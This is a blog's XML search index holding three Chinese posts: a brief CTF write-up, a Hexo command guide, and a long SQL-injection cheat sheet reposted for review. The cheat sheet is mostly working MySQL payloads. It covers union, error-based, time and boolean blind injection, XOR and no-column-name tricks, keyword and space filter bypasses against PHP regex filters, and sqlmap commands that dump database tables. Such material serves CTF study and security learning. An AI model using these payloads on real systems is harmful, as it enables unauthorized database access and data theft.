<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Nctf write up]]></title>
    <url>%2F2019%2F08%2F29%2FN-CTF%2F</url>
    <content type="text"><![CDATA[签到题 查看源代码 md5 collision md5碰撞，考查php中’==’的缺陷，查看文章 签到2输入口令zhimakaimen即可,发现直接输入限制字数 采用post传参即可]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[sql注入常用合集]]></title>
    <url>%2F2019%2F08%2F26%2Fsql%E6%B3%A8%E5%85%A5%E5%90%88%E9%9B%86%2F</url>
    <content type="text"><![CDATA[Mysql 常用命令基本词 Mysql版本version() 当前用户名user() 数据库名database() 数据库路径@@datadir 操作系统版本@@version_compile_os Mysql的安装路径@@basedir Union注入 Mysql要大于5.0 找到注入点后获取字段数 1order by Num 查看字段回显 1id=-1 union select 1,2....,n 获取系统数据库名 1select null,null,schema_name from information_schema.schemata 直接获取当前数据库名 1select null,null...,database() 获取数据库中的表 1select null,null,...,group_concat(table_name) from information_schama.tables where table_schema=database() 获取表中的字段 1select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='&lt;表名&gt;' 获取各个字段值 1select null,group_concat(&lt;字段1&gt;,&lt;字段2&gt;) from &lt;当前表名&gt; UNION+JOIN注入 适用于：逗号被过滤 1union select * from (select 1)a join (select 1)b join (select database())c; 报错注入 若有报错信息则选择报错注入 UpdateXaml(有长度限制，max=32位) 1id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 如果concat被过滤了，可以使用MAKE_SET函数 ExtractValue(有长度限制,最长32位) 1id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) 如果concat被过滤了，可以使用MAKE_SET函数 exp(5.5.5以上) 1234567普通查询select exp(~(select*from(select user())x));得到表名：select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));得到列名：select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));检索数据：select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)); mysql&gt;5.5.53时，则不能返回查询结果 floor(需要三个函数支持) 1Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a; count(*)、rand()、group by三者缺一不可 floor完整的注入流程 其余报错 1234567891011121314151617181920212223GeometryCollection()id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))polygon()id =1 AND polygon((select * from(select * from(select user())a)b))multipoint()id = 1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()id = 1 AND multilinestring((select * from(select * from(select user())a)b))linestring()id = 1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon()id =1 AND multipolygon((select * from(select * from(select user())a)b)) 都不怎么好用 时间，布尔盲注一把梭时间sleep 1If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 if判断语句，条件为假，执行sleep BENCHMARK 1BENCHMARK(count,expr) 在运行过程中占用大量的cpu资源 笛卡尔积 1' and if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)# 查询数据量极大的表造成延时。 不正确正则 1select if(substr((select 1)='1',1,1),concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1); 布尔1234567891011121314151617left(user(),1)&gt;'r' right(user(),1)&gt;'r' substr(user(),1,1)='r' mid(user(),1,1)='r' greatest("sed",database())= "sed" //返回最大值再与字符串比较select least("sea",database())="sea"; //返回最小值再与字符串比较//不使用逗号user() regexp '^[a-z]'user() like 'root%' //注意_/%通配符，建议写脚本的时候时候写到字符集最后面POSITION('root' in user())mid(user() from 1 for 1)='r'mid(user() from 1)='r'substr(user() from 1 for 1)='r'substr(user() from 1)='r'ASCII()、ORD()和CHAR()函数一般用做辅助。 Bypass一把梭过滤空格两个空格代替一个空格，用Tab代替空格，注释代替空格 123%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ 括号绕过空格 1id=1'and(sleep(ascii(substr(database(),1,1))=109)) # 空格被过滤，括号没有被过滤，可以用括号绕过 过滤逗号盲注（substr(),mid(),limit） 12345select substr(database() from 1 for 1);select mid(database() from 1 for 1);//对于limit可以使用offset来绕过//limit 0,1 等价于 limit 1 offset 0 直接替换为like注入 1select user() like 'ro%' 注意通配符 % union + join注入 123union select 1,2#等价于union select * from (select 1)a join (select 2)b 过滤比较符号过滤了等号 12345原代码：select * from users where id =1regexp: select * from users where id REGEXP '^1$'!&lt;&gt;: select * from users where !(id&lt;&gt;1)in: select 'user' in ('user'); 字符串都是可以用16进制代替的. 用函数绕过: strcmp(),locate(s1,s) , position(s1 in s) , instr(s,s1), greatest() 过滤了大于小于 1234greatest(a,b) 返回a和b中较大的那个数。select * from users where id=1 and ord(mid(database(),0,1))&gt;1等价select * from users where id=1 and greatest(ord(mid(database(),0,1)),123)=123 过滤了ifcase…when…then…else来代替 123select * from users where id=1 and if(1=1,sleep(5),0)等价于：select * from users where id=1 and case when 1=1 then sleep(5) else 0 end 常见Bypass PHP中一些常见的过滤方法及绕过方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859过滤关键字 and orphp代码 preg_match('/(and|or)/i',$id)会过滤的攻击代码 1 or 1=1 1 and 1=1绕过方式 1 || 1=1 1 &amp;&amp; 1=1过滤关键字 and or unionphp代码 preg_match('/(and|or|union)/i',$id)会过滤的攻击代码 union select user,password from users绕过方式 1 &amp;&amp; (select user from users where userid=1)='admin'过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users limit 1) = 'admin'过滤关键字 and, or, union, where, limitphp代码 preg_match('/(and|or|union|where|limit)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select user from users limit 1) = 'admin'绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin过滤关键字 and, or, union, where, limit, group byphp代码 preg_match('/(and|or|union|where|limit|group by)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1过滤关键字 and, or, union, where, limit, group by, selectphp代码 preg_match('/(and|or|union|where|limit|group by|select)/i', $id)会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1绕过方式 1 &amp;&amp; substr(user,1,1) = 'a'过滤关键字 and, or, union, where, limit, group by, select, 'php代码 preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1绕过方式 1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)过滤关键字 and, or, union, where, limit, group by, select, ', hexphp代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = unhex(61)绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。过滤关键字 and, or, union, where, limit, group by, select, ', hex, substrphp代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt;绕过方式 1 &amp;&amp; lpad(user,7,1)过滤关键字 and, or, union, where, limit, group by, select, ', hex, substr, 空格php代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)会过滤的攻击代码 1 &amp;&amp; lpad(user,7,1)/td&gt;绕过方式 1%0b||%0blpad(user,7,1)过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 || (select user from users where user_id = 1) = 'admin'绕过方式 1 || (select user from users limit 1) = 'admin' 各种骚姿势一把梭update、insert、delete注入MySQL下Update、Insert注入方法 pow溢出报错pow(x,y)表示计算x的y次方，当计算值过大时，会发生DOUBLE溢出，数据库报错 1select 1 and if(1=1,1,pow(2,2222222222222222222)) 过滤了延时语句，正常页面与错误页面没有区别，当sql语句出错时会返回自定义的错误页面。 XOR注入1admin'^(ascii(mid((password)from(i)))&gt;j)^'1'='1'%23或者admin'^(ascii(mid((password)from(i)for(1)))&gt;j)^'1'='1'%23 过滤了关键字：and、or过滤了逗号，过滤了空格 regexp注入1select (select语句) regexp '正则' 过滤了=、in、like order by盲注暂略 无列名注入在不知道 MySQL 列名的情况下泄露数据的 SQL 注入技巧 1-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -需要注意字段数，以及回显的地方，以及要查询的东西 适用于：数据泄露或者过滤关键字段名的一把梭 基础指令一把梭URL直接注入 12345python2 sqlmap.py -u "www.xxx.com?id=1" --dbspython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx --tablespython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx --tablespython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx -T xxx --columnspython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx -T xxx -C xxx --dump 从文件中加载HTTP请求先从burpsuite Copt to file 然后 1python2 sqlmap.py -r "选择你保存的文件的路径" 适用于：cookie，POST数据等 本文知识点原整理作者：P2hm1n 原文链接 本人只是初建博客借P2hm1n师傅的知识结构回顾，转到自己博客方便查看 特此感谢P2hm1n师傅的总结]]></content>
      <categories>
        <category>基础回顾</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[hexo指南]]></title>
    <url>%2F2019%2F08%2F26%2Fhexo%E5%B8%B8%E7%94%A8%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[hexo指南 hexo new ‘文章标题’ 本地预览 hexo g hexo s 部署到github hexo clean hexo g -d 生成草稿 hexo new draft “文章标题” 发布草稿 hexo publish [layout]]]></content>
      <categories>
        <category>基础回顾</category>
      </categories>
  </entry>
</search>
